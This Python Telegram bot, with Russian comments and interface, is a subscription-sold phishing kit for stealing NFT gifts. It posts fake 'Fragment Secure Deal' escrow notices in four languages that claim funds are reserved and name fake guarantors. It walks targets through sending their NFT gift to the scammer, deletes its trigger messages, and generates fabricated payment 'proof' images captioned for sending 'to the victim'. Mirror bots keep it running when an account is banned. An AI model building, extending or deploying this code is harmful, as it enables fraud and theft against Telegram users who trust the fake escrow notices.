import os
import re
import uuid
import asyncio
import logging
import sys
import random
import string
import sqlite3
import time
from datetime import datetime
from io import BytesIO
from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import (Message, CallbackQuery, InlineKeyboardButton,
                           InlineKeyboardMarkup, BusinessConnection,
                           BufferedInputFile)
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError, TelegramUnauthorizedError
from dotenv import load_dotenv
from PIL import Image, ImageDraw, ImageFont

load_dotenv()
logging.basicConfig(level=logging.INFO, stream=sys.stdout)
log = logging.getLogger("offerbot")

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
DEFAULT_RECEIVER = os.getenv("RECEIVER_USERNAME", "vo1d_root")
DB_PATH = os.getenv("DB_PATH", "/data/bot.db")

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

BUSINESS_CONNS = {}

# ==========================================
# СЛОВАРИ ПЕРЕВОДОВ
# ==========================================
LANGUAGES = {
    "ru": {"title": "🛡 Fragment · Безопасная сделка", "notice": "Уведомление о зарезервированной сделке", "user_offers": "Пользователь <b>@{buyer}</b> инициировал безопасный обмен вашего подарка <b>{nft}</b> на <b>{price}</b>.", "status": "✅ <b>Статус:</b> Средства успешно зарезервированы смарт-контрактом.", "guarants": "🔒 <b>Гаранты:</b> @TelegramSuporteDeDados, @notoscam", "time": "⏱ <b>Лимит времени:</b> 6 часов до отмены резерва.", "btn_accept": "Принять", "btn_reject": "Отклонить"},
    "en": {"title": "🛡 Fragment · Secure Deal", "notice": "Escrow transaction notification", "user_offers": "User <b>@{buyer}</b> initiated a secure exchange of your gift <b>{nft}</b> for <b>{price}</b>.", "status": "✅ <b>Status:</b> Funds successfully reserved by smart contract.", "guarants": "🔒 <b>Guarantors:</b> @TelegramSuporteDeDados, @notoscam", "time": "⏱ <b>Time limit:</b> 6 hours until reservation cancellation.", "btn_accept": "Accept", "btn_reject": "Decline"},
    "it": {"title": "🛡 Fragment · Transazione Sicura", "notice": "Notifica di transazione in escrow", "user_offers": "L'utente <b>@{buyer}</b> ha avviato uno scambio sicuro del tuo regalo <b>{nft}</b> per <b>{price}</b>.", "status": "✅ <b>Stato:</b> Fondi riservati con successo dallo smart contract.", "guarants": "🔒 <b>Garanzia:</b> @TelegramSuporteDeDados, @notoscam", "time": "⏱ <b>Limite di tempo:</b> 6 ore fino all'annullamento.", "btn_accept": "Accetta", "btn_reject": "Rifiuta"},
    "zh": {"title": "🛡 Fragment · 安全交易", "notice": "托管交易通知", "user_offers": "用户 <b>@{buyer}</b> 发起了安全交换，将您的礼物 <b>{nft}</b> 交换为 <b>{price}</b>。", "status": "✅ <b>状态：</b> 资金已由智能合约成功预留。", "guarants": "🔒 <b>担保人：</b> @TelegramSuporteDeDados, @notoscam", "time": "⏱ <b>时间限制：</b> 距离取消预留还有 6 小时。", "btn_accept": "接受", "btn_reject": "拒绝"}
}

# ==========================================
# БАЗА ДАННЫХ
# ==========================================
def get_db():
    os.makedirs(os.path.dirname(DB_PATH) or ".", exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute("""CREATE TABLE IF NOT EXISTS business_conns (user_id INTEGER PRIMARY KEY, conn_id TEXT)""")
        conn.execute("""CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY, subscribed INTEGER DEFAULT 0,
            sub_type TEXT DEFAULT 'none', test_used INTEGER DEFAULT 0, 
            my_username TEXT, stats_created INTEGER DEFAULT 0, stats_accepted INTEGER DEFAULT 0
        )""")
        conn.execute("DROP TABLE IF EXISTS offers")
        conn.execute("""CREATE TABLE IF NOT EXISTS offers (
            id TEXT PRIMARY KEY, nft_name TEXT, nft_slug TEXT, 
            price_amount TEXT, price_currency TEXT, lang TEXT DEFAULT 'ru',
            buyer_id INTEGER, buyer_username TEXT, target_user TEXT, 
            message_id INTEGER, conn_id TEXT, created_at INTEGER
        )""")
        conn.execute("""CREATE TABLE IF NOT EXISTS mirrors (id INTEGER PRIMARY KEY AUTOINCREMENT, token TEXT UNIQUE, username TEXT, added_by INTEGER)""")
        conn.execute("CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY)")
        
        cur = conn.execute("SELECT COUNT(*) FROM keys")
        if cur.fetchone()[0] == 0:
            for _ in range(100):
                key = "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
                conn.execute("INSERT INTO keys (key) VALUES (?)", (key,))

init_db()

# ==========================================
# РЕГУЛЯРКИ
# ==========================================
NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)", re.I)
PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐|grams)", re.I)
CODE_RE = re.compile(r"(of_[a-f0-9]{5})", re.I)

def parse_nft(url: str):
    m = NFT_RE.search(url)
    if not m: return None
    slug_raw = m.group(1)
    parts = slug_raw.rsplit("-", 1)
    name_raw, num = (parts[0], parts[1]) if len(parts) == 2 and parts[1].isdigit() else (slug_raw, "")
    display = re.sub(r"(?<!^)(?=[A-Z])", " ", name_raw).strip()
    return {"slug": slug_raw, "name": f"{display} #{num}" if num else display}

def parse_price(text: str):
    m = PRICE_RE.search(text)
    if not m: return None
    amount, unit = m.group(1), m.group(2).lower()
    if unit in ("gram", "грам", "grams"): return (amount, "Gram")
    return (amount, "Stars")

# ==========================================
# ГЕНЕРАЦИЯ ДОКАЗАТЕЛЬСТВА (PILLOW)
# ==========================================
def generate_proof_image(nft_name: str, price_str: str) -> BytesIO:
    template_path = "IMG_0401.jpg"
    if not os.path.exists(template_path):
        img = Image.new('RGB', (800, 600), color=(14, 22, 33))
        draw = ImageDraw.Draw(img)
        draw.text((50, 50), f"Шаблон {template_path} не найден!", fill=(255, 0, 0))
        output = BytesIO()
        img.save(output, format="PNG")
        output.seek(0)
        return output

    img = Image.open(template_path)
    draw = ImageDraw.Draw(img)

    rect_x1, rect_y1 = 350, 320
    rect_x2, rect_y2 = 1020, 420
    
    draw.rectangle([rect_x1, rect_y1, rect_x2, rect_y2], fill=(28, 35, 49))

    try:
        font_large = ImageFont.truetype("arial.ttf", 24)
        font_small = ImageFont.truetype("arial.ttf", 16)
        font_price = ImageFont.truetype("arialbd.ttf", 26)
    except:
        font_large = ImageFont.load_default()
        font_small = ImageFont.load_default()
        font_price = ImageFont.load_default()

    now = datetime.now()
    date_str = f"Сегодня, {now.strftime('%H:%M')}"
    
    draw.text((370, 335), date_str, fill=(150, 150, 150), font=font_small)
    draw.text((370, 365), nft_name, fill=(255, 255, 255), font=font_large)
    
    price_text = f"{price_str} ⭐"
    draw.text((800, 360), price_text, fill=(255, 255, 255), font=font_price)

    output = BytesIO()
    img.save(output, format="PNG")
    output.seek(0)
    return output

# ==========================================
# ОТПРАВКА / УДАЛЕНИЕ
# ==========================================
async def safe_send(bot_instance: Bot, chat_id: int, text: str, conn_id: str, reply_markup=None, retries=3):
    for attempt in range(retries):
        try:
            return await bot_instance.send_message(
                chat_id=chat_id, text=text, business_connection_id=conn_id,
                reply_markup=reply_markup, disable_web_page_preview=False
            )
        except TelegramBadRequest as e:
            if "PEER_FLOOD" in str(e): await asyncio.sleep(30)
            else: return None
        except Exception: return None
    return None

async def delete_code_message(bot_instance: Bot, chat_id: int, msg_id: int, conn_id: str):
    try: 
        await bot_instance.delete_business_messages(business_connection_id=conn_id, message_ids=[msg_id])
    except Exception:
        try: 
            await bot_instance.edit_message_text(text="\u200b", chat_id=chat_id, message_id=msg_id, business_connection_id=conn_id)
        except Exception: 
            pass

# ==========================================
# BUSINESS CONNECTION
# ==========================================
@router.business_connection()
async def on_business_conn(conn: BusinessConnection):
    BUSINESS_CONNS[conn.user.id] = conn.id
    with get_db() as db_conn:
        db_conn.execute("INSERT OR REPLACE INTO business_conns (user_id, conn_id) VALUES (?, ?)", (conn.user.id, conn.id))
    log.info(f"✅ Business: user={conn.user.id} id={conn.id}")

# ==========================================
# МЕНЮ
# ==========================================
async def show_main_menu(target, uid):
    with get_db() as conn:
        user = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
    
    if not user:
        with get_db() as conn:
            conn.execute("INSERT INTO users (user_id, my_username) VALUES (?, ?)", (uid, DEFAULT_RECEIVER))
        user = {"subscribed": 0, "test_used": 0, "stats_created": 0, "stats_accepted": 0, "my_username": DEFAULT_RECEIVER}
    
    status = "✅ Активна" if user["subscribed"] else ("🎁 Тест-доступ" if user["test_used"] == 0 else "❌ Нет доступа")
    
    text = (
        f"👑 <b>NFT Trade Panel</b>\n\n"
        f"Статус: <b>{status}</b>\n"
        f"Создано офферов: <b>{user['stats_created']}</b>\n"
        f"Успешных передач: <b>{user['stats_accepted']}</b>\n\n"
        f"<b>Создать оффер:</b>\n<code>/offer [ссылка] [цена] [@юзер] [язык]</code>"
    )
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Создать оффер", callback_data="create_offer_btn")],
        [InlineKeyboardButton(text="📁 Мои офферы", callback_data="my_offers_menu")],
        [InlineKeyboardButton(text="🪞 Зеркала", callback_data="mirrors_menu")],
        [InlineKeyboardButton(text="⚙️ Настройки", callback_data="settings")],
        [InlineKeyboardButton(text="💎 Подписка", callback_data="buy_sub")]
    ])
    
    if isinstance(target, Message): await target.reply(text, reply_markup=kb)
    else: await target.message.edit_text(text, reply_markup=kb)

@router.message(Command("start"))
async def cmd_start(msg: Message):
    if msg.from_user.id == ADMIN_ID:
        await msg.reply("👑 <b>Админ:</b>\n/keys\n/set_default @ник\n/addkey\n/setbotmax [токен]\n/delbot @username\n/restartbots")
        return
    await show_main_menu(msg, msg.from_user.id)

@router.callback_query(F.data == "main_menu")
async def cb_main_menu(cb: CallbackQuery):
    await show_main_menu(cb, cb.from_user.id)
    await cb.answer()

# ==========================================
# МОИ ОФФЕРЫ (ИСПРАВЛЕНО .get)
# ==========================================
@router.callback_query(F.data == "my_offers_menu")
async def cb_my_offers_menu(cb: CallbackQuery):
    uid = cb.from_user.id
    with get_db() as conn:
        offers = conn.execute("SELECT * FROM offers WHERE buyer_id=? ORDER BY created_at DESC LIMIT 10", (uid,)).fetchall()
    
    if not offers:
        await cb.message.edit_text("📁 <b>Мои офферы</b>\n\nУ вас пока нет активных офферов.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]]))
        return

    await cb.message.edit_text("📁 <b>Ваши последние офферы:</b>\nВыберите оффер для управления:")
    
    for o in offers:
        o_dict = dict(o) # Конвертируем в словарь, чтобы работал .get()
        lang = o_dict.get("lang", "ru")
        lang_name = {"ru": "🇷🇺 RU", "en": "🇺🇸 EN", "it": "🇮🇹 IT", "zh": "🇨🇳 CH"}.get(lang, "RU")
        price_str = f"{o['price_amount']} ⭐️" if o["price_currency"] == "Stars" else f"{o['price_amount']} Gram"
        
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="📸 Доказательство", callback_data=f"proof:{o['id']}"),
                InlineKeyboardButton(text="🗑 Удалить", callback_data=f"del_offer:{o['id']}")
            ]
        ])
        
        await cb.message.answer(
            f"🆔 <code>{o['id']}</code> | {lang_name}\n🎁 {o['nft_name']}\n💰 {price_str}",
            reply_markup=kb
        )
    await cb.answer()

@router.callback_query(F.data.startswith("proof:"))
async def cb_proof(cb: CallbackQuery):
    oid = cb.data.split(":")[1]
    with get_db() as conn:
        offer = conn.execute("SELECT * FROM offers WHERE id=?", (oid,)).fetchone()
    
    if not offer:
        await cb.answer("Оффер не найден", show_alert=True)
        return

    price_str = offer["price_amount"]
    await cb.message.answer("⏳ Генерирую доказательство для этого оффера...")
    
    img_bio = generate_proof_image(offer["nft_name"], price_str)
    photo = BufferedInputFile(img_bio.read(), filename="proof.png")
    
    await cb.message.answer_photo(
        photo, 
        caption=f"✅ Доказательство для оффера <code>{oid}</code> готово.\nОтправьте это фото жертве."
    )
    await cb.answer()

@router.callback_query(F.data.startswith("del_offer:"))
async def cb_del_offer(cb: CallbackQuery):
    oid = cb.data.split(":")[1]
    with get_db() as conn:
        conn.execute("DELETE FROM offers WHERE id=?", (oid,))
    await cb.message.edit_text(f"🗑 Оффер <code>{oid}</code> удален.")
    await cb.answer()

# ==========================================
# ПОДПИСКА
# ==========================================
@router.callback_query(F.data == "buy_sub")
async def cb_buy_sub(cb: CallbackQuery):
    text = (
        "<b>💎 Подписка NFT Trade</b>\n\n"
        "• <b>Месяц</b> — 500 ⭐️\n"
        "• <b>Год</b> — 2000 ⭐️\n"
        "• <b>Навсегда</b> — 5000 ⭐️\n\n"
        "<b>Почему так дорого?</b>\n"
        "Да потому что даже подписка за месяц окупается за <b>ОДИН</b> профит, "
        "который ты сделаешь за 30-60 минут. Мы даем тебе не просто бота, а рабочий инструмент, "
        "который приносит деньги с первого дня. Ты не тратишь, ты инвестируешь.\n\n"
        f"Переведите звезды на: <b>@{DEFAULT_RECEIVER}</b>\n"
        "После оплаты введите: <code>/key TG-XXXXXX</code>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Оплатить", url=f"https://t.me/{DEFAULT_RECEIVER}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
    ])
    await cb.message.edit_text(text, reply_markup=kb)
    await cb.answer()

# ==========================================
# КОМАНДЫ КЛИЕНТА
# ==========================================
@router.message(Command("key"))
async def cmd_key(msg: Message):
    parts = msg.text.split()
    if len(parts) < 2: return await msg.reply("❌ /key TG-XXXXXX")
    key = parts[1].upper()
    uid = msg.from_user.id
    with get_db() as conn:
        if conn.execute("SELECT key FROM keys WHERE key=?", (key,)).fetchone():
            conn.execute("DELETE FROM keys WHERE key=?", (key,))
            conn.execute("UPDATE users SET subscribed=1 WHERE user_id=?", (uid,))
            await msg.reply("✅ Ключ активирован!")
            await show_main_menu(msg, uid)
        else:
            await msg.reply("❌ Неверный ключ.")

@router.message(Command("setuser"))
async def cmd_setuser(msg: Message):
    uid = msg.from_user.id
    parts = msg.text.split()
    if len(parts) < 2 or not parts[1].startswith("@"):
        return await msg.reply("❌ Формат: <code>/setuser @ваш_ник</code>")
    new_rec = parts[1].replace("@", "").strip()
    with get_db() as conn:
        conn.execute("UPDATE users SET my_username=? WHERE user_id=?", (new_rec, uid))
    await msg.reply(f"✅ Ник изменен на <b>@{new_rec}</b>.")

@router.callback_query(F.data == "create_offer_btn")
async def cb_create_offer(cb: CallbackQuery):
    await cb.message.edit_text(
        "📝 <b>Формат:</b>\n<code>/offer [ссылка] [цена] [@username] [язык]</code>\n\n"
        "Пример:\n<code>/offer https://t.me/nft/MirageLamp-73768 1500 stars @target en</code>\n\n"
        "Языки: ru, en, it, zh (по умолчанию ru).",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]])
    )
    await cb.answer()

@router.callback_query(F.data == "settings")
async def cb_settings(cb: CallbackQuery):
    uid = cb.from_user.id
    with get_db() as conn:
        user = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
    curr = user["my_username"] if user and user["my_username"] else DEFAULT_RECEIVER
    text = (
        f"<b>⚙️ Настройки</b>\n\nВаш ник: <b>@{curr}</b>\n\n"
        f"▪️ <code>/setuser @ник</code> — сменить ник\n"
        f"▪️ <code>/key TG-XXXXXX</code> — активировать подписку"
    )
    await cb.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]]))
    await cb.answer()

# ==========================================
# СОЗДАНИЕ ОФФЕРА
# ==========================================
@router.message(F.text.regexp(r"^/offer\s+"))
async def cmd_offer(msg: Message):
    uid = msg.from_user.id
    is_admin = (uid == ADMIN_ID)
    
    with get_db() as conn:
        user = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
    
    if not is_admin and (not user or not user["subscribed"]):
        return await msg.reply("❌ Подписка не активна. /start")

    if uid not in BUSINESS_CONNS and not is_admin:
        return await msg.reply("❌ Подключите бота к Telegram Business!")

    parts = msg.text.replace("/offer", "").strip().split()
    if len(parts) < 3: return await msg.reply("❌ /offer [ссылка] [цена] [@юзер] [язык]")

    lang = "ru"
    if parts[-1].lower() in LANGUAGES:
        lang = parts[-1].lower()
        parts = parts[:-1]

    url, target_user = parts[0], parts[-1]
    price_text = " ".join(parts[1:-1])
    nft, price_data = parse_nft(url), parse_price(price_text)
    
    if not nft or not price_data: return await msg.reply("❌ Ошибка формата.")

    oid = "of_" + uuid.uuid4().hex[:5]
    buyer_name = user["my_username"] if not is_admin and user else msg.from_user.username
    now = int(time.time())
    
    with get_db() as conn:
        conn.execute(
            "INSERT INTO offers (id, nft_name, nft_slug, price_amount, price_currency, lang, buyer_id, buyer_username, target_user, created_at) VALUES (?,?,?,?,?,?,?,?,?,?)",
            (oid, nft["name"], nft["slug"], price_data[0], price_data[1], lang, uid, buyer_name, target_user, now)
        )
        if not is_admin:
            conn.execute("UPDATE users SET stats_created = stats_created + 1 WHERE user_id=?", (uid,))
        
    await msg.reply(f"✅ Оффер <code>{oid}</code> ({lang.upper()}) создан.")

@router.message(F.text.regexp(r"^/cancel_(of_[a-f0-9]{5})$"))
async def cmd_cancel_offer(msg: Message):
    oid = msg.text.replace("/cancel_", "").strip()
    with get_db() as conn:
        offer = conn.execute("SELECT * FROM offers WHERE id=? AND buyer_id=?", (oid, msg.from_user.id)).fetchone()
        if offer:
            if offer["message_id"] and offer["conn_id"]:
                asyncio.create_task(delete_code_message(msg.bot, offer["buyer_id"], offer["message_id"], offer["conn_id"]))
            conn.execute("DELETE FROM offers WHERE id=?", (oid,))
            await msg.reply("🗑 Оффер отменен.")
        else: await msg.reply("❌ Не найден.")

# ==========================================
# ОТПРАВКА ОФФЕРА В ЧАТ
# ==========================================
@router.business_message(F.text)
async def handle_business_message(msg: Message):
    if msg.from_user and msg.from_user.is_bot: return
    m = CODE_RE.search(msg.text)
    if not m: return
    oid = m.group(1).lower()
    
    with get_db() as conn:
        offer = conn.execute("SELECT * FROM offers WHERE id=?", (oid,)).fetchone()
    
    if not offer or msg.from_user.id != offer["buyer_id"]: return

    conn_id = getattr(msg, "business_connection_id", None)
    if not conn_id:
        with get_db() as db_conn:
            row = db_conn.execute("SELECT conn_id FROM business_conns WHERE user_id=?", (msg.from_user.id,)).fetchone()
        if row: conn_id = row["conn_id"]
    if not conn_id: return

    await delete_code_message(msg.bot, msg.chat.id, msg.message_id, conn_id)
    await asyncio.sleep(1.5)

    offer_dict = dict(offer)
    lang_data = LANGUAGES.get(offer_dict.get("lang", "ru"), LANGUAGES["ru"])
    price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
    nft_link = f"https://t.me/nft/{offer['nft_slug']}"
    hidden_link = f'<a href="{nft_link}">&#8203;</a>'

    card_text = (
        f"{hidden_link}" 
        f"<b>{lang_data['title']} #{oid.upper()[3:]}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>{lang_data['notice']}</b>\n\n"
        f"{lang_data['user_offers'].format(buyer=offer['buyer_username'], nft=offer['nft_name'], price=price_str)}\n\n"
        f"{lang_data['status']}\n"
        f"{lang_data['guarants']}\n"
        f"{lang_data['time']}\n\n"
        f"<i>...</i>\n\n"
        f"{nft_link}"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=lang_data['btn_reject'], callback_data=f"reject:{oid}"),
         InlineKeyboardButton(text=lang_data['btn_accept'], callback_data=f"accept1:{oid}")]
    ])
    
    sent = await safe_send(msg.bot, msg.chat.id, card_text, conn_id, reply_markup=kb)
    
    if sent:
        with get_db() as conn:
            conn.execute("UPDATE offers SET message_id=?, conn_id=? WHERE id=?", (sent.message_id, conn_id, oid))

@router.callback_query(F.data.startswith("accept1:"))
async def on_accept1(cb: CallbackQuery):
    oid = cb.data.split(":", 1)[1]
    with get_db() as conn:
        offer = conn.execute("SELECT * FROM offers WHERE id=?", (oid,)).fetchone()
        if offer:
            conn.execute("UPDATE users SET stats_accepted = stats_accepted + 1 WHERE user_id=?", (offer["buyer_id"],))
    if not offer: return
    price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
    
    await cb.message.edit_text(
        f"<b>Сумма {price_str} зарезервирована.</b>\n\n1. Ознакомьтесь.\n2. Нажмите «Передать NFT».",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Передать NFT", callback_data=f"accept2:{oid}")]])
    )
    await cb.answer()

@router.callback_query(F.data.startswith("accept2:"))
async def on_accept2(cb: CallbackQuery):
    oid = cb.data.split(":", 1)[1]
    with get_db() as conn:
        offer = conn.execute("SELECT * FROM offers WHERE id=?", (oid,)).fetchone()
    if not offer: return
    
    native_url = f"tg://send_gift?slug={offer['nft_slug']}"
    await cb.message.edit_text(
        f"<b>Инструкция:</b>\n1. Кнопка ниже.\n2. Выберите «Передать NFT».\n3. Получатель: <b>@{offer['buyer_username']}</b>.\n4. Подтвердите.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Передать NFT ↗", url=native_url)]])
    )
    await cb.answer()

@router.callback_query(F.data.startswith("reject:"))
async def on_reject(cb: CallbackQuery):
    await cb.message.edit_reply_markup(reply_markup=None)
    await cb.answer("Отклонено.")

# ==========================================
# АДМИН
# ==========================================
@router.message(Command("keys"))
async def cmd_keys(msg: Message):
    if msg.from_user.id != ADMIN_ID: return
    with get_db() as conn:
        keys = conn.execute("SELECT key FROM keys LIMIT 30").fetchall()
        total = conn.execute("SELECT COUNT(*) FROM keys").fetchone()[0]
    await msg.reply(f"<b>Ключи ({total}):</b>\n<code>{chr(10).join([k['key'] for k in keys])}</code>...")

@router.message(Command("addkey"))
async def cmd_addkey(msg: Message):
    if msg.from_user.id != ADMIN_ID: return
    key = "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
    with get_db() as conn:
        conn.execute("INSERT INTO keys (key) VALUES (?)", (key,))
    await msg.reply(f"✅ Ключ создан: <code>{key}</code>")

@router.message(F.text.regexp(r"^/set_default\s+"))
async def cmd_set_default(msg: Message):
    if msg.from_user.id != ADMIN_ID: return
    global DEFAULT_RECEIVER
    DEFAULT_RECEIVER = msg.text.replace("/set_default", "").strip().replace("@", "")
    await msg.reply(f"✅ Получатель: @{DEFAULT_RECEIVER}")

@router.message(F.text.regexp(r"^/setbotmax\s+"))
async def cmd_setbotmax(msg: Message):
    if msg.from_user.id != ADMIN_ID: return
    parts = msg.text.split()
    if len(parts) < 2: return await msg.reply("❌ /setbotmax [ТОКЕН_БОТА]")
    try:
        temp_bot = Bot(token=parts[1])
        await temp_bot.delete_webhook(drop_pending_updates=True)
        me = await temp_bot.get_me()
        with get_db() as conn:
            conn.execute("INSERT OR REPLACE INTO mirrors (token, username, added_by) VALUES (?, ?, ?)", (parts[1], me.username, msg.from_user.id))
        await msg.reply(f"✅ Зеркало <b>@{me.username}</b> сохранено. Напиши /restartbots.")
    except Exception as e: await msg.reply(f"❌ Ошибка: {e}")

@router.message(F.text.regexp(r"^/delbot\s+@?(\w+)"))
async def cmd_delbot(msg: Message):
    if msg.from_user.id != ADMIN_ID: return
    username = msg.text.replace("/delbot", "").strip().replace("@", "")
    with get_db() as conn:
        if conn.execute("DELETE FROM mirrors WHERE username=?", (username,)).rowcount > 0:
            await msg.reply(f"🗑 Зеркало @{username} удалено.")
        else: await msg.reply(f"❌ Не найдено.")

@router.message(Command("restartbots"))
async def cmd_restartbots(msg: Message):
    if msg.from_user.id != ADMIN_ID: return
    await msg.reply("🔄 Перезапускаю...")
    os._exit(0) 

# ==========================================
# ЗАПУСК
# ==========================================
async def main():
    bots_to_start = [bot]
    with get_db() as conn:
        mirrors = conn.execute("SELECT token, username FROM mirrors").fetchall()
    for m in mirrors:
        try:
            m_bot = Bot(token=m["token"], default=DefaultBotProperties(parse_mode=ParseMode.HTML))
            await m_bot.delete_webhook(drop_pending_updates=True)
            bots_to_start.append(m_bot)
        except Exception: pass
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(*bots_to_start)

if __name__ == "__main__":
    asyncio.run(main())
